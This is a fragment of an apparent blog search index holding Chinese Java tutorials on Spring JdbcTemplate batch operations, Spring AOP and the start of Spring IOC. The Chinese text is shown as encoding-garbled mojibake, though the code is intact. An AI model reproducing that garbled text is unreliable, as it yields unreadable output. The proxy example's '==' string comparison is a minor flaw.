{\"MySQL2\",\"c5\",\"5\"};\n  batchArgs.add(o1);\n  batchArgs.add(o2);\n  batchArgs.add(o3);\n  bookService.batchUpdate(batchArgs);\n}\n```\n\n### æ‰¹é‡åˆ é™¤\n\n```java\n@Override\npublic void batchDelete(List<Object[]> batchArgs) {\n  String sql = \"delete from book where id=?\";\n  int[] ints = jdbcTemplate.batchUpdate(sql, batchArgs);\n  System.out.println(Arrays.toString(ints));\n}\n```\n\næµ‹è¯•\n\n```java\n@Test\npublic void testbatchDelete() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  BookService bookService = context.getBean(\"bookService\", BookService.class);\n  List<Object[]> batchArgs = new ArrayList<>();\n  Object[] o1 = {\"3\"};\n  Object[] o2 = {\"4\"};\n  batchArgs.add(o1);\n  batchArgs.add(o2);\n  bookService.batchDelete(batchArgs);\n}\n```\n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Spring"],"categories":["Spring"]},{"title":"Spring-AOP","url":"/posts/17849.html","content":"\n##  å‰è¨€\n\nä»Šå¤©å¼€å§‹å­¦ä¹ æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html) ä¸­çš„ã€ŠSpring-AOPã€‹ï¼Œå°ç®€ä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡2å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š04-13\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š04-13\n- [x] ğŸ€æ€»ç»“ï¼šä½¿ç”¨å¾ˆç®€å•ï¼Œä¸€å¤©æå®šï¼Œæºç éƒ¨åˆ†åé¢å†çœ‹\n\n## æ¦‚å¿µ\n\nAOPï¼šé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼Œåˆ©ç”¨ AOP å¯ä»¥å¯¹ä¸šåŠ¡é€»è¾‘çš„å„ä¸ªéƒ¨åˆ†è¿›è¡Œéš”ç¦»ï¼Œä»è€Œä½¿å¾—ä¸šåŠ¡é€»è¾‘å„éƒ¨åˆ†ä¹‹é—´çš„è€¦åˆåº¦é™ä½ï¼Œæé«˜ç¨‹åºçš„å¯é‡ç”¨æ€§ï¼ŒåŒæ—¶æé«˜äº†å¼€å‘çš„æ•ˆç‡ã€‚\n\né€šä¿—æè¿°ï¼šä¸é€šè¿‡ä¿®æ”¹æºä»£ç æ–¹å¼ï¼Œåœ¨ä¸»å¹²åŠŸèƒ½é‡Œé¢æ·»åŠ æ–°åŠŸèƒ½\n\n## åº•å±‚åŸç†\n\nAOPåº•å±‚ä½¿ç”¨åŠ¨æ€ä»£ç†\n\n- 1ã€æœ‰æ¥å£æƒ…å†µï¼Œä½¿ç”¨ JDK åŠ¨æ€ä»£ç†\n  - åˆ›å»ºæ¥å£å®ç°ç±»ä»£ç†å¯¹è±¡ï¼Œå¢å¼ºç±»çš„æ–¹æ³•\n\n- 2ã€æ²¡æœ‰æ¥å£æƒ…å†µï¼Œä½¿ç”¨ CGLIB åŠ¨æ€ä»£ç† \n  - åˆ›å»ºå­ç±»çš„ä»£ç†å¯¹è±¡ï¼Œå¢å¼ºç±»çš„æ–¹æ³•  \n\n## JDKåŠ¨æ€ä»£ç†\n\nJDK åŠ¨æ€ä»£ç†ï¼Œä½¿ç”¨ Proxy ç±»é‡Œé¢çš„æ–¹æ³•åˆ›å»ºä»£ç†å¯¹è±¡ï¼Œè°ƒç”¨ newProxyInstance æ–¹æ³•\n\n```java\npublic static Object newProxyInstance(ClassLoader loader,\n                                      Class<?>[] interfaces,\n                                      InvocationHandler h)\n```\n\n- ç¬¬ä¸€å‚æ•°ï¼Œç±»åŠ è½½å™¨\n- ç¬¬äºŒå‚æ•°ï¼Œå¢å¼ºæ–¹æ³•æ‰€åœ¨çš„ç±»ï¼Œè¿™ä¸ªç±»å®ç°çš„æ¥å£ï¼Œæ”¯æŒå¤šä¸ªæ¥å£ \n- ç¬¬ä¸‰å‚æ•°ï¼Œå®ç°è¿™ä¸ªæ¥å£ InvocationHandlerï¼Œåˆ›å»ºä»£ç†å¯¹è±¡ï¼Œå†™å¢å¼ºçš„éƒ¨åˆ† \n\n**æ¨¡æ‹Ÿ JDK åŠ¨æ€ä»£ç†ä»£ç ** \n\nåœºæ™¯ï¼šç°æœ‰ add å’Œ update ä¸¤æ–¹æ³•ï¼Œåœ¨ä¸æ”¹å˜æºç çš„æƒ…å†µä¸‹ï¼Œå¢å¼ºè¿™ä¸¤æ–¹æ³•\n\nStep1ï¼šåˆ›å»ºæ¥å£ï¼Œå®šä¹‰æ–¹æ³•\n\n```java\npublic interface UserDao {\n    public int add(int a, int b);\n    public String update(String id);\n}\n```\n\nStep2ï¼šåˆ›å»ºæ¥å£å®ç°ç±»ï¼Œå®ç°æ–¹æ³•\n\n```java\npublic class UserDaoImpl implements UserDao {\n    @Override\n    public int add(int a, int b) {\n        System.out.println(\"addæ–¹æ³•æ‰§è¡Œäº† ...\");\n        return a + b;\n    }\n    @Override\n    public String update(String id) {\n        System.out.println(\"updateæ–¹æ³•æ‰§è¡Œäº† ...\");\n        return id;\n    }\n}\n```\n\nStep3: ä½¿ç”¨ Proxy ç±»åˆ›å»ºæ¥å£ä»£ç†å¯¹è±¡\n\n```java\npublic class JDKProxy {\n    public static void main(String[] args) {\n        // åˆ›å»ºæ¥å£å®ç°ç±»ä»£ç†å¯¹è±¡\n        Class[] interfaces = {UserDao.class};\n        // æ³¨å…¥æ¥å£å®ç°ç±»\n        UserDaoImpl userDao = new UserDaoImpl();\n        UserDao dao = (UserDao) Proxy.newProxyInstance(JDKProxy.class.getClassLoader(), interfaces, new UserDaoProxy(userDao));\n        int add = dao.add(1, 2);\n        System.out.println(\"addç»“æœï¼š\"+ add);\n        String update = dao.update(\"1\");\n        System.out.println(\"updateç»“æœï¼š\"+ update);\n    }\n}\n// åˆ›å»ºä»£ç†å¯¹è±¡ä»£ç \nclass UserDaoProxy implements InvocationHandler {\n    // æŠŠåˆ›å»ºçš„ä»£ç†å¯¹è±¡ä¼ é€’è¿‡æ¥\n    // é€šè¿‡æœ‰å‚æ„é€ ä¼ é€’\n    private Object obj;\n    public UserDaoProxy(Object obj) {\n        this.obj = obj;\n    }\n    // å½“è¯¥å¯¹è±¡è¢«è°ƒç”¨å°±æ‰§è¡Œinvokeæ–¹æ³•\n    // å¢å¼ºé€»è¾‘ç¼–å†™åœ¨invokeæ–¹æ³•ä¸­\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n        // æ–¹æ³•ä¹‹å‰å¤„ç†\n        System.out.println(\"æ–¹æ³•ä¹‹å‰æ‰§è¡Œ...\\n\" + method.getName() + \"ä¼ é€’çš„å‚æ•°ï¼š\" + Arrays.toString(args));\n        // è¢«å¢å¼ºçš„æ–¹æ³•æ‰§è¡Œ\n        Object res = method.invoke(obj, args);\n        // å¯¹ä¸åŒæ–¹æ³•è¿›è¡Œä¸åŒå¢å¼º\n        if (method.getName() == \"add\") {\n            System.out.println(\"å¢å¼ºaddæ–¹æ³• ...\");\n        } else if (method.getName() == \"update\") {\n            System.out.println(\"å¢å¼ºupdateæ–¹æ³• ...\");\n        }\n        // æ–¹æ³•ä¹‹åå¤„ç†\n        System.out.println(\"æ–¹æ³•ä¹‹åæ‰§è¡Œ...\" + obj);\n        return res;\n    }\n}\n/**\næ–¹æ³•ä¹‹å‰æ‰§è¡Œ...\naddä¼ é€’çš„å‚æ•°ï¼š[1, 2]\naddæ–¹æ³•æ‰§è¡Œäº† ...\nå¢å¼ºaddæ–¹æ³• ...\næ–¹æ³•ä¹‹åæ‰§è¡Œ...com.jwt.aop.UserDaoImpl@63947c6b\naddç»“æœï¼š3\næ–¹æ³•ä¹‹å‰æ‰§è¡Œ...\nupdateä¼ é€’çš„å‚æ•°ï¼š[1]\nupdateæ–¹æ³•æ‰§è¡Œäº† ...\nå¢å¼ºupdateæ–¹æ³• ...\næ–¹æ³•ä¹‹åæ‰§è¡Œ...com.jwt.aop.UserDaoImpl@63947c6b\nupdateç»“æœï¼š1\n**/\n```\n\n## æ“ä½œæœ¯è¯­\n\n**è¿æ¥ç‚¹ï¼š**ç±»é‡Œé¢å“ªäº›æ–¹æ³•å¯ä»¥è¢«å¢å¼ºï¼Œå“ªäº›æ–¹æ³•å°±è¢«ç§°ä¸ºè¿æ¥ç‚¹\n\n**åˆ‡å…¥ç‚¹ï¼š**å®é™…ä¸Šè¢«å¢å¼ºçš„æ–¹æ³•ï¼Œç§°ä¸ºåˆ‡å…¥ç‚¹\n\n**é€šçŸ¥(å¢å¼º)ï¼š**å®é™…å¢å¼ºçš„é€»è¾‘éƒ¨åˆ†ç§°ä¸ºé€šçŸ¥(å¢å¼º)ï¼Œå³åœ¨åˆ‡å…¥ç‚¹åŠ å…¥çš„é€»è¾‘ä»£ç å°±ç§°ä¸ºé€šçŸ¥(å¢å¼º)ï¼Œé€šçŸ¥æœ‰å¤šç§ç±»å‹\n\n- â‘ å‰ç½®é€šçŸ¥ï¼šåœ¨åˆ‡å…¥ç‚¹ä¹‹å‰æ‰€æ‰§è¡Œçš„æ–¹æ³•\n- â‘¡åç½®é€šçŸ¥ï¼šåœ¨åˆ‡å…¥ç‚¹ä¹‹åæ‰€æ‰§è¡Œçš„æ–¹æ³•\n- â‘¢ç¯ç»•é€šçŸ¥ï¼š åœ¨åˆ‡å…¥ç‚¹ä¹‹å‰ä¹‹åéƒ½æ‰§è¡Œçš„æ–¹æ³•\n- â‘£å¼‚å¸¸é€šçŸ¥ï¼šå½“åˆ‡å…¥ç‚¹å¼‚å¸¸æ—¶æ‰§è¡Œçš„æ–¹æ³•\n- â‘¤æœ€ç»ˆé€šçŸ¥ï¼šæœ€ç»ˆä¸€å®šä¼šæ‰§è¡Œçš„æ–¹æ³•\n\n**åˆ‡é¢ï¼š**ä¸€ä¸ªåŠ¨ä½œï¼Œå°†é€šçŸ¥åº”ç”¨åˆ°åˆ‡å…¥ç‚¹çš„è¿‡ç¨‹å°±å«åˆ‡é¢\n\n## AOPæ“ä½œ\n\nSpring æ¡†æ¶ä¸€èˆ¬éƒ½æ˜¯åŸºäº AspectJ å®ç° AOP æ“ä½œï¼ŒAspectJ æ˜¯ç‹¬ç«‹ AOP æ¡†æ¶è€Œä¸æ˜¯ Spring ç»„æˆéƒ¨åˆ†ï¼Œä¸€èˆ¬æŠŠ AspectJ å’Œ Spirng æ¡†æ¶ä¸€èµ·ä½¿ç”¨ï¼Œè¿›è¡Œ AOP æ“ä½œ\n\nåŸºäº **AspectJ** å®ç° **AOP** æ“ä½œ\n\n- 1ã€åŸºäº xml é…ç½®æ–‡ä»¶å®ç°\n\n- 2ã€åŸºäºæ³¨è§£æ–¹å¼å®ç°\n\n## å‡†å¤‡å·¥ä½œ\n\n1ã€å¼•å…¥**AOP**ç›¸å…³ä¾èµ– \n\n- éœ€è¦å¯¼å…¥å¦‚ä¸‹5ä¸ªä¾èµ–åŒ…\n\n```java\nspring-aop-5.3.18.jar //ï¼ˆSpringè‡ªå¸¦ï¼‰\nspring-aspects-5.3.18.jar //ï¼ˆSpringè‡ªå¸¦ï¼‰\naspectjweaver.jar\naopalliance.jar\ncglib-3.3.0.jar  \n```\n\n-  AspectJä¸‹è½½ï¼š[AspectJ Downloads](https://www.eclipse.org/aspectj/downloads.php)\n  - ä¸‹è½½åè¿è¡Œ aspectj-1.9.6.jar åœ¨ lib ç›®å½•ä¸‹å¯ä»¥æ‰¾åˆ° aspectjweaver.jar\n  - æˆ–è€…ç›´æ¥åœ¨è¿™ä¸‹è½½[aspectjweaver](https://mvnrepository.com/artifact/org.aspectj/aspectjweaver/1.8.13)\n\n- aopallianceä¸‹è½½ï¼š[aopalliance.jar](https://sourceforge.net/projects/aopalliance/files/aopalliance/1.0/aopalliance.zip/download)ï¼Œéœ€è¦ç­‰å¾…ä¸€ä¸‹æ‰ä¼šå¼¹å‡ºä¸‹è½½æ¡†ã€‚\n\n- cglibä¸‹è½½ï¼š[cglib/cglib (github.com)](https://github.com/cglib/cglib/releases/tag/RELEASE_3_3_0)\n\n2ã€äº†è§£åˆ‡å…¥ç‚¹è¡¨è¾¾å¼\n\n- åˆ‡å…¥ç‚¹è¡¨è¾¾å¼ä½œç”¨ï¼šçŸ¥é“å¯¹å“ªä¸ªç±»é‡Œé¢çš„å“ªä¸ªæ–¹æ³•è¿›è¡Œå¢å¼º \n\n- è¯­æ³•ç»“æ„ï¼š`execution([æƒé™ä¿®é¥°ç¬¦] [è¿”å›ç±»å‹] [ç±»å…¨è·¯å¾„].[æ–¹æ³•åç§°](..))`\n\n  - æƒé™ä¿®é¥°ç¬¦ï¼šå¯ä»¥çœç•¥\n\n  - è¿”å›ç±»å‹ï¼šå¯ä½¿ç”¨é€šé…ç¬¦`*`ï¼Œè¡¨ç¤ºä»»æ„è¿”å›å€¼\n\n  - ç±»å…¨ç±»åï¼šç±»è·¯å¾„ä¸‹çš„å®Œæ•´è·¯å¾„\n\n  - æ–¹æ³•åç§°()ï¼šæŒ‡å®šå“ªä¸ªæ–¹æ³•å¢å¼ºï¼Œ()å¡«å…¥æ–¹æ³•å‚æ•°åˆ—è¡¨ï¼Œ`..`ä¸¤ä¸ªç‚¹è¡¨ç¤ºæ–¹æ³•ä¸­çš„å‚æ•°\n\n```java\n//ä¾‹ 1ï¼šå¯¹ com..dao.BookDao ç±»é‡Œé¢çš„ add è¿›è¡Œå¢å¼º\nexecution(* com.atguigu.dao.BookDao.add(..))\n\n//ä¾‹ 2ï¼šå¯¹ com.dao.BookDao ç±»é‡Œé¢çš„æ‰€æœ‰çš„æ–¹æ³•è¿›è¡Œå¢å¼º\nexecution(* com.atguigu.dao.BookDao.*(..))\n\n//ä¾‹ 3ï¼šå¯¹ com.dao åŒ…é‡Œé¢æ‰€æœ‰ç±»ï¼Œç±»é‡Œé¢æ‰€æœ‰æ–¹æ³•è¿›è¡Œå¢å¼º\nexecution(* com.atguigu.dao.*.*(..))\n```\n\n## åŸºäºæ³¨è§£æ–¹å¼å®ç°\n\nStep1ï¼šåˆ›å»ºç±»ï¼Œåœ¨ç±»é‡Œé¢å®šä¹‰æ–¹æ³•\n\n```java\n// è¢«å¢å¼ºçš„ç±»\n@Component\npublic class User {\n    public void add() {\n        //int i = 10 / 0;\n        System.out.println(\"add ...\");\n    }\n}\n```\n\nStep2ï¼šåˆ›å»ºå¢å¼ºç±»(ç¼–å†™å¢å¼ºé€»è¾‘)\n\n```java\n// å¢å¼ºç±»\n@Component\n// ç”Ÿæˆä»£ç†å¯¹è±¡\n@Aspect\npublic class UserProxy {\n    // å‰ç½®é€šçŸ¥ @Before:è¡¨ç¤ºå‰ç½®é€šçŸ¥ valueå¢å¼ºUserçš„addæ–¹æ³•\n    @Before(value = \"execution(* com.jwt.aop.User.add(..))\")\n    public void before() {\n        System.out.println(\"beforeå‰ç½®é€šçŸ¥ ...\");\n    }\n    // æœ€ç»ˆé€šçŸ¥\n    @After(value = \"execution(* com.jwt.aop.User.add(..))\")\n    public void after() {\n        System.out.println(\"afteræœ€ç»ˆé€šçŸ¥ ...\");\n    }\n    // åç½®é€šçŸ¥ï¼ˆè¿”å›é€šçŸ¥ï¼‰\n    @AfterReturning(value = \"execution(* com.jwt.aop.User.add(..))\")\n    public void afterReturning() {\n        System.out.println(\"afterReturningåç½®é€šçŸ¥ï¼ˆè¿”å›é€šçŸ¥ï¼‰ ...\");\n    }\n    // å¼‚å¸¸é€šçŸ¥\n    @AfterThrowing(value = \"execution(* com.jwt.aop.User.add(..))\")\n    public void afterThrowing() {\n        System.out.println(\"afterThrowingå¼‚å¸¸é€šçŸ¥ ...\");\n    }\n    // ç¯ç»•é€šçŸ¥\n    @Around(value = \"execution(* com.jwt.aop.User.add(..))\")\n    public void around(ProceedingJoinPoint proceedingJoinPoint) throws Throwable {\n        System.out.println(\"ç¯ç»•é€šçŸ¥aroundç¯ç»•ä¹‹å‰ ...\");\n        // æ‰§è¡Œè¢«å¢å¼ºçš„æ–¹æ³•\n        proceedingJoinPoint.proceed();\n        System.out.println(\"ç¯ç»•é€šçŸ¥aroundç¯ç»•ä¹‹å ...\");\n    }\n}\n```\n\nStep3ï¼šåœ¨ spring é…ç½®æ–‡ä»¶ä¸­ï¼Œè¿›è¡Œé€šçŸ¥çš„é…ç½® \n\n- 1ã€å¼€å¯contextå’Œaopå‘½åç©ºé—´\n- 2ã€å¼€å¯æ³¨è§£åŒ…æ‰«æ\n- 3ã€å¼€å¯AspectJç”Ÿæˆä»£ç†å¯¹è±¡\n\n```xml\n<!-- å¼€å¯contextå’Œaopå‘½åç©ºé—´-->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xmlns:aop=\"http://www.springframework.org/schema/aop\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n       http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\">\n\n    <!-- å¼€å¯æ³¨è§£æ‰«æ -->\n    <context:component-scan base-package=\"com.jwt.aop\"></context:component-scan>\n    <!-- å¼€å¯Aspectç”Ÿæˆä»£ç†å¯¹è±¡-->\n    <aop:aspectj-autoproxy></aop:aspectj-autoproxy>\n</beans>\n```\n\nStep4ï¼šæµ‹è¯•\n\n```java\npublic class TestBean {\n    @Test\n    public void test() {\n        //1 åŠ è½½ spring é…ç½®æ–‡ä»¶\n        ApplicationContext context =\n                new ClassPathXmlApplicationContext(\"bean2.xml\");\n        //2 è·å–é…ç½®åˆ›å»ºçš„å¯¹è±¡\n        User user = context.getBean(\"user\", User.class);\n        System.out.println(user);\n        user.add();\n    }\n}\n/**\ncom.jwt.aop.User@3cebbb30\nç¯ç»•é€šçŸ¥aroundç¯ç»•ä¹‹å‰ ...\nbeforeå‰ç½®é€šçŸ¥ ...\nadd ...\nafterReturningåç½®é€šçŸ¥ï¼ˆè¿”å›é€šçŸ¥ï¼‰ ...\nafteræœ€ç»ˆé€šçŸ¥ ...\nç¯ç»•é€šçŸ¥aroundç¯ç»•ä¹‹å ...\n**/\n```\n\n### æŠ½å–å…¬å…±åˆ‡å…¥ç‚¹\n\n**å®šä¹‰å…¬å…±åˆ‡å…¥ç‚¹**\n\n```java\n@Pointcut(value = \"execution(* com.jwt.aop.User.add(..))\")\npublic void pointDemo() {}\n```\n\n**å¼•ç”¨å…¬å…±åˆ‡å…¥ç‚¹**\n\n```java\n// å‰ç½®é€šçŸ¥\n@Before(value = \"pointDemo()\")\npublic void before() {\n    System.out.println(\"beforeå‰ç½®é€šçŸ¥ ...\");\n}\n\n// æœ€ç»ˆé€šçŸ¥\n@After(value = \"pointDemo()\")\npublic void after() {\n  \tSystem.out.println(\"afteræœ€ç»ˆé€šçŸ¥ ...\");\n}\n```\n\n### å¯¹åŒä¸€åˆ‡å…¥ç‚¹è®¾ç½®ä¼˜å…ˆçº§\n\nåœºæ™¯ï¼šæœ‰å¤šä¸ªå¢å¼ºç±»å¯¹åŒä¸€ä¸ªæ–¹æ³•è¿›è¡Œå¢å¼ºï¼Œè®¾ç½®å¢å¼ºç±»ä¼˜å…ˆçº§\n\n```java\n@Component\n@Aspect\n@Order(0) // å¯¹åŒä¸€åˆ‡å…¥ç‚¹å¢å¼ºçš„ä¼˜å…ˆçº§ å€¼è¶Šå°ä¼˜å…ˆçº§åˆ«è¶Šé«˜\npublic class PersonProxy {\n}\n```\n\n```java\n@Component\n@Aspect\n@Order(1) // å¯¹åŒä¸€åˆ‡å…¥ç‚¹å¢å¼ºçš„ä¼˜å…ˆçº§ å€¼è¶Šå°ä¼˜å…ˆçº§åˆ«è¶Šé«˜\npublic class UserProxy {\n}\n```\n\nPersonProxy æ¯” UserProxy å…ˆå¯¹æ–¹æ³•è¿›è¡Œå¢å¼º\n\n## å®Œå…¨ä½¿ç”¨æ³¨è§£å¼€å‘\n\nåˆ›å»ºé…ç½®ç±»\n\n```java\n@Configuration// @Configurationä½œä¸ºé…ç½®ç±» æ›¿ä»£xmlé…ç½®æ–‡ä»¶\n@ComponentScan(basePackages = {\"com.jwt.aop\"})\n@EnableAspectJAutoProxy(proxyTargetClass = true)\npublic class SpringConfig2 {\n}\n```\n\næµ‹è¯•\n\n```java\n@Test\npublic void test2() {\n  AnnotationConfigApplicationContext context = \n    new AnnotationConfigApplicationContext(SpringConfig2.class);\n  User user = context.getBean(\"user\", User.class);\n  System.out.println(user);\n  user.add();\n}\n\n/**\ncom.jwt.aop.User@f736069\nç¯ç»•é€šçŸ¥aroundç¯ç»•ä¹‹å‰ ...\nbeforeå‰ç½®é€šçŸ¥ ...\nadd ...\nafterReturningåç½®é€šçŸ¥ï¼ˆè¿”å›é€šçŸ¥ï¼‰ ...\nafteræœ€ç»ˆé€šçŸ¥ ...\nç¯ç»•é€šçŸ¥aroundç¯ç»•ä¹‹å ...\n**/\n```\n\n## åŸºäº xml é…ç½®å®ç°\n\nStep1ï¼šåˆ›å»ºä¸¤ä¸ªç±»,å¢å¼ºç±»å’Œè¢«å¢å¼ºç±»\n\n```java\npublic class Book {\n    public void buy() {\n        System.out.println(\"buy ...\");\n    }\n}\n\npublic class BookProxy {\n    public void before() {\n        System.out.println(\"before ...\");\n    }\n    public void after() {\n        System.out.println(\"after ...\");\n    }\n}\n```\n\nStep2ï¼šå¼€å¯aopå‘½åç©ºé—´\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:aop=\"http://www.springframework.org/schema/aop\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\">\n   \n</beans>   \n```\n\nStep3ï¼šåœ¨springé…ç½®æ–‡ä»¶ä¸­åˆ›å»ºä¸¤ä¸ªç±»çš„å®ä¾‹å¯¹è±¡\n\n```xml\n<!--åˆ›å»ºå¯¹è±¡-->\n<bean id=\"book\" class=\"com.jwt.aop.Book\"/>\n<bean id=\"bookProxy\" class=\"com.jwt.aop.BookProxy\"/>\n```\n\nStep4ï¼šåœ¨springé…ç½®æ–‡ä»¶ä¸­é…ç½®åˆ‡å…¥ç‚¹\n\n```xml\n<!--é…ç½®aopå¢å¼º-->\n<aop:config>\n  <!--é…ç½®åˆ‡å…¥ç‚¹-->\n  <aop:pointcut id=\"p\" expression=\"execution(* com.jwt.aop.Book.buy(..))\"/>\n  <!--é…ç½®åˆ‡é¢-->\n  <aop:aspect ref=\"bookProxy\">\n    <!--æŠŠbeforeæ–¹æ³•ä½œç”¨åœ¨å…¬å…±åˆ‡å…¥ç‚¹æŒ‡å®šçš„åˆ‡å…¥ç‚¹ä¸Šé¢-->\n    <aop:before method=\"before\" pointcut-ref=\"p\"/>\n\n    <!--ä¸é€‚ç”¨å…¬å…±åˆ‡å…¥ç‚¹-->\n    <aop:after method=\"after\" pointcut=\"execution(* com.jwt.aop.Book.buy(..))\"/>\n  </aop:aspect>\n</aop:config>\n```\n\nStep5ï¼šæµ‹è¯•\n\n```java\n@Test\npublic void testAopXml() {\n  ClassPathXmlApplicationContext context = \n    new ClassPathXmlApplicationContext(\"bean3.xml\");\n  Book book = context.getBean(\"book\", Book.class);\n  book.buy();\n}\n/**\nbefore ...\nbuy ...\nafter ...\n**/\n```\n\n## å‚è€ƒ\n\n- [Spring-AOPæ¦‚å¿µåŠä½¿ç”¨æ•™ç¨‹](https://blog.csdn.net/weixin_45496190/article/details/107082732?spm=1001.2014.3001.5502)\n- [Spring-AOP](https://blog.csdn.net/xiaoyixiao_/article/details/116851579?spm=1001.2014.3001.5502)\n\n##  â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Spring"],"categories":["Spring"]},{"title":"Spring-IOC","url":"/posts/18155.html","content":"\n## å‰è¨€\n\nä»Šå¤©å¼€å§‹å­¦ä¹ æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html) ä¸­çš„ã€ŠSpring-IOCã€‹ï¼Œå°ç®€ä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡2å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š04-10\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š04-12\n- [x] ğŸ€æ€»ç»“ï¼šè¶…æ—¶ä¸€å¤©ï¼ï¼ï¼\n\n## Spring æ¦‚è¿°\n\n### ç®€ä»‹\n\n-  Spring æ˜¯è½»é‡çº§çš„å¼€æºçš„JavaEEæ¡†æ¶\n- Spring å¯ä»¥è§£å†³ä¼ä¸šåº”ç”¨å¼€å‘çš„å¤æ‚æ€§ \n\n- Spring æœ‰ä¸¤ä¸ªæ ¸å¿ƒéƒ¨åˆ†ï¼šIOC å’Œ AOP\n  - IOCï¼šæ§åˆ¶åè½¬ï¼ŒæŠŠåˆ›å»ºå¯¹è±¡è¿‡ç¨‹äº¤ç»™ Spring è¿›è¡Œç®¡ç† \n  - AOPï¼šé¢å‘åˆ‡é¢ï¼Œä¸ä¿®æ”¹æºä»£ç è¿›è¡ŒåŠŸèƒ½å¢å¼º\n\n###  ç‰¹ç‚¹\n\n- 1ã€æ–¹ä¾¿è§£è€¦ï¼Œç®€åŒ–å¼€å‘ \n- 2ã€AOP ç¼–ç¨‹æ”¯æŒ \n- 3ã€æ–¹ä¾¿ç¨‹åºæµ‹è¯•\n- 4ã€æ–¹ä¾¿å’Œå…¶ä»–æ¡†æ¶è¿›è¡Œæ•´åˆ\n- 5ã€æ–¹ä¾¿è¿›è¡Œäº‹åŠ¡æ“ä½œ \n- 6ã€é™ä½ APIå¼€å‘éš¾åº¦ \n\n### ä¼˜ç‚¹\n\n- è½»é‡çº§ï¼šSpring åœ¨å¤§å°å’Œé€æ˜æ€§æ–¹é¢ç»å¯¹å±äºè½»é‡çº§çš„ï¼ŒåŸºç¡€ç‰ˆæœ¬çš„ Spring æ¡†æ¶å¤§çº¦åªæœ‰2MBã€‚\n\n- 